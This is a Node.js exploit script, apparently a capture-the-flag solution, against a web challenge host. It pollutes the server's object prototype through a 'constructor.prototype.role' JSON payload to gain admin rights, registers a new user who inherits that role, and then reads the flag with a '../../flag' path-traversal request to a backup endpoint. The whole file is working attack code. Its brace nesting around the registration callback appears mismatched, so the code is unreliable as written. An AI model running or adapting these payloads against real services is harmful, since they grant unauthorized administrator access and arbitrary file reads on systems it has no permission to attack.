
const http = require('http');
const querystring = require('querystring');

const existingUid = "50dca5dce7c748b394c1119db2d036b9";

console.log("👉 Step 1: Login existing user, poison prototype...");
const loginData = querystring.stringify({uid: existingUid});
const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

const loginReq = http.request(loginOpts, function(res) {
  const cookie = res.headers['set-cookie'].map(function(c) { return c.split(';')[0]; }).join('; ');
  console.log("✅ Logged in, poisoning...");

  const poisonData = JSON.stringify({
    uid: existingUid,
    constructor: {
      prototype: {
        role: 'admin'
      }
    }
  });

  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };

  const poisonReq = http.request(poisonOpts, function(poisonRes) {
    let body = '';
    poisonRes.on('data', function(chunk) { body += chunk; });
    poisonRes.on('end', function() {
      console.log("✅ Poisoning done! Object.prototype.role = 'admin'");
      console.log("👉 Register new user (only username)...");

      const regData = querystring.stringify({username: "finaldone"});
      const regOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/register',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(regData)
        }
      };

      const regReq = http.request(regOpts, function(regRes) {
        let regBody = '';
        regRes.on('data', function(chunk) { regBody += chunk; });
        regRes.on('end', function() {
          let match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
          if (match) {
            let newUid = match[1];
            console.log(`✅ Registered new user, UID: ${newUid}`);
            console.log("👉 Login new user...");

            const newLoginData = querystring.stringify({uid: newUid});
            const newLoginOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/login',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(newLoginData)
              }
            };

            const newLoginReq = http.request(newLoginOpts, function(newLoginRes) {
              let newCookie = newLoginRes.headers['set-cookie'].map(function(c) { return c.split(';')[0]; }).join('; ');
              console.log("✅ Logged in, checking role...");

              const profileData = JSON.stringify({uid: newUid});
              const profileOpts = {
                hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                port: 80,
                path: '/api/profile',
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'Content-Length': Buffer.byteLength(profileData),
                  'Cookie': newCookie
                }
              };

              const profileReq = http.request(profileOpts, function(profileRes) {
                let profileBody = '';
                profileRes.on('data', function(chunk) { profileBody += chunk; });
                profileRes.on('end', function() {
                  console.log("\n📄 Profile response:");
                  console.log(profileBody);
                  try {
                    let json = JSON.parse(profileBody);
                    console.log("\n🔍 Role is:", json.role);
                    if (json.role === 'admin') {
                      console.log("\n🎉 SUCCESS! We are admin! Getting flag...");
                      const flagData = querystring.stringify({file: '../../flag'});
                      const flagOpts = {
                        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
                        port: 80,
                        path: '/api/backup',
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/x-www-form-urlencoded',
                          'Content-Length': Buffer.byteLength(flagData),
                          'Cookie': newCookie
                        }
                      };
                      const flagReq = http.request(flagOpts, function(flagRes) {
                        let flagBody = '';
                        flagRes.on('data', function(chunk) { flagBody += chunk; });
                        flagRes.on('end', function() {
                          console.log("\n🏁🏁🏁 FINAL FLAG:");
                          console.log(flagBody);
                        });
                      });
                      flagReq.write(flagData);
                      flagReq.end();
                    }
                  } catch(e) {
                    console.log("Error:", e);
                  }
                });
              });
              profileReq.write(profileData);
              profileReq.end();
            });
          });
          newLoginReq.write(newLoginData);
          newLoginReq.end();
        });
      });
      regReq.write(regData);
      regReq.end();
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', function(err) { console.error(err); });
loginReq.write(loginData);
loginReq.end();
